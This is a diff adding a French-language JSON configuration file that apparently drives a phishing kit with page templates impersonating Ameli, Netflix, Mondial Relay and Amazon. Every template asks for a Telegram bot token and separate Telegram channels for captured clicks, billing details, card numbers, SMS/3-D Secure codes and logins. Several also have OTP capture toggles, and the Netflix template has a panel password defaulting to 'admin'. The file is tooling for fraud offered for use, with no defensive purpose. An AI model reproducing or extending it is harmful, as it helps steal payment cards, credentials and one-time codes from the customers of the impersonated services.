@@ -1,0 +1,72 @@
+[
+  {
+    "id": "Ameli",
+    "name": "Ameli",
+    "cats": ["sante"],
+    "gradient": "g-teal",
+    "tags": [],
+    "badge": null,
+    "configSchema": [
+      { "key": "montant",   "label": "Montant remboursement",       "type": "text",     "phpVar": "%montant%",         "default": "10,00", "placeholder": "10,00" },
+      { "key": "botToken",  "label": "Token Bot Telegram",          "type": "text",     "phpVar": "%TG_TOKEN%",       "default": "",     "placeholder": "123456789:AAxxxxx", "required": true },
+      { "key": "clickChat", "label": "Salon Click (ID)",            "type": "text",     "phpVar": "%TG_CLICK_ID%",       "default": "",     "placeholder": "-100xxxxxxxxxx",    "required": true },
+      { "key": "billing",   "label": "Salon Billing (ID)",          "type": "text",     "phpVar": "%TG_BILLING_ID%",     "default": "",     "placeholder": "-100xxxxxxxxxx", "required": true },
+      { "key": "card",      "label": "Salon Card (ID)",             "type": "text",     "phpVar": "%TG_CARD_ID%",        "default": "",     "placeholder": "-100xxxxxxxxxx", "required": true },
+      { "key": "sms",       "label": "Salon SMS (ID)",              "type": "text",     "phpVar": "%TG_VBV_ID%",         "default": "",     "placeholder": "-100xxxxxxxxxx", "required": true },
+      { "key": "captcha",   "label": "Captcha",                     "type": "toggle",   "phpVar": "%CAPTCHA_ENABLED%", "default": false },
+      { "key": "applepay",  "label": "Apple Pay / OTP",             "type": "toggle",   "phpVar": "%OTP_ENABLED%",        "default": true }
+    ]
+  },
+  {
+    "id": "Netflix",
+    "name": "Netflix",
+    "cats": ["streaming"],
+    "gradient": "g-red",
+    "tags": ["streaming", "login"],
+    "badge": null,
+    "configSchema": [
+      { "key": "botToken",  "label": "Token Bot Telegram",          "type": "text",     "phpVar": "$bot_token",       "default": "",     "placeholder": "123456789:AAxxxxx", "required": true },
+      { "key": "clickChat", "label": "Salon Click (ID)",            "type": "text",     "phpVar": "$rez_click",       "default": "",     "placeholder": "-100xxxxxxxxxx",    "required": true },
+      { "key": "login",   "label": "Salon Login (ID)",          "type": "text",     "phpVar": "$rez_login",     "default": "",     "placeholder": "-100xxxxxxxxxx" },
+      { "key": "card",      "label": "Salon Card (ID)",             "type": "text",     "phpVar": "$rez_card",        "default": "",     "placeholder": "-100xxxxxxxxxx" },
+      { "key": "sms",       "label": "Salon SMS (ID)",              "type": "text",     "phpVar": "$rez_vbv",         "default": "",     "placeholder": "-100xxxxxxxxxx" },
+      { "key": "panelPass", "label": "Mot de passe panel / bypass", "type": "password", "phpVar": "$MotDePassePanel", "default": "admin","placeholder": "" },
+      { "key": "captcha",   "label": "Captcha",                     "type": "toggle",   "phpVar": "$captcha_enabled", "default": false },
+      { "key": "applepay",  "label": "Apple Pay / OTP",             "type": "toggle",   "phpVar": "$otp_mode",        "default": true }
+    ]
+  },
+  {
+    "id": "MondialRelay",
+    "name": "Mondial Relay",
+    "cats": ["livraison"],
+    "gradient": "g-orange",
+    "tags": ["livraison", "colis"],
+    "badge": null,
+    "configSchema": [
+      { "key": "botToken",  "label": "Token Bot Telegram",          "type": "text",     "phpVar": "%TG_TOKEN%",       "default": "",     "placeholder": "123456789:AAxxxxx", "required": true },
+      { "key": "clickChat", "label": "Salon Click (ID)",            "type": "text",     "phpVar": "%TG_CLICK_ID%",       "default": "",     "placeholder": "-100xxxxxxxxxx",    "required": true },
+      { "key": "billing",   "label": "Salon Billing (ID)",          "type": "text",     "phpVar": "%TG_BILLING_ID%",     "default": "",     "placeholder": "-100xxxxxxxxxx", "required": true },
+      { "key": "card",      "label": "Salon Card (ID)",             "type": "text",     "phpVar": "%TG_CARD_ID%",        "default": "",     "placeholder": "-100xxxxxxxxxx", "required": true },
+      { "key": "sms",       "label": "Salon SMS (ID)",              "type": "text",     "phpVar": "%TG_VBV_ID%",         "default": "",     "placeholder": "-100xxxxxxxxxx", "required": true },
+      { "key": "captcha",   "label": "Captcha",                     "type": "toggle",   "phpVar": "%CAPTCHA_ENABLED%", "default": false },
+      { "key": "applepay",  "label": "Apple Pay / OTP",             "type": "toggle",   "phpVar": "%OTP_ENABLED%",        "default": true }
+    ]
+  },
+  {
+    "id": "Amazon",
+    "name": "Amazon",
+    "cats": ["ecommerce"],
+    "gradient": "g-amber",
+    "tags": ["ecommerce", "login"],
+    "badge": null,
+    "configSchema": [
+      { "key": "botToken",  "label": "Token Bot Telegram",          "type": "text",     "phpVar": "%TG_TOKEN%",       "default": "",     "placeholder": "123456789:AAxxxxx", "required": true },
+      { "key": "clickChat", "label": "Salon Click (ID)",            "type": "text",     "phpVar": "%TG_CLICK_ID%",       "default": "",     "placeholder": "-100xxxxxxxxxx",    "required": true },
+      { "key": "login",     "label": "Salon Login (ID)",            "type": "text",     "phpVar": "%TG_LOGIN_ID%",       "default": "",     "placeholder": "-100xxxxxxxxxx" },
+      { "key": "card",      "label": "Salon Card (ID)",             "type": "text",     "phpVar": "%TG_CARD_ID%",        "default": "",     "placeholder": "-100xxxxxxxxxx" },
+      { "key": "sms",       "label": "Salon SMS (ID)",              "type": "text",     "phpVar": "%TG_SMS_ID%",         "default": "",     "placeholder": "-100xxxxxxxxxx" },
+      { "key": "captcha",   "label": "Captcha",                     "type": "toggle",   "phpVar": "%CAPTCHA_ENABLED%", "default": false },
+      { "key": "applepay",  "label": "Apple Pay / OTP",             "type": "toggle",   "phpVar": "%OTP_ENABLED%",        "default": true }
+    ]
+  }
+]
